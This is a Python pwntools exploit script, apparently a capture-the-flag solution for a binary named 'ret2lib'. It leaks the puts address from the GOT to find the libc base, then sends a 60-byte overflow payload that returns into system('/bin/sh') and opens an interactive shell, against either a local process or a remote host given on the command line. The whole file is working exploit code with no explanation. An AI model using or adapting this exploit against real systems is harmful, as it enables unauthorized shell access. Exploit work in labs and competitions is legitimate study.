#!/usr/bin/env python
from pwn import *
import sys
context.log_level="debug"
#context.log_level="info"
code=ELF("./ret2lib",checksec=False)
context.terminal = ['gnome-terminal','-x','sh','-c']
context.arch = code.arch
if len(sys.argv)>2:
    con=remote(sys.argv[1],int(sys.argv[2]))
    libc=ELF("./libc.so")
else:
    con=code.process()
    if(context.arch == "amd64"):
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    else:
        libc=ELF("/lib/i386-linux-gnu/libc.so.6")
def z(commond=""):
    gdb.attach(con,commond)
def exploit():
    con.sendlineafter("(in dec) :",str(code.got['puts']))
    con.recvuntil("0x")
    libc.address=int(con.recvuntil("\n").strip(),16)-libc.symbols['puts']
    payload = "a"*60+p32(libc.symbols["system"])+"a"*4+p32(libc.search("/bin/sh").next())
    con.sendafter("me :",payload)
exploit()
con.interactive()    
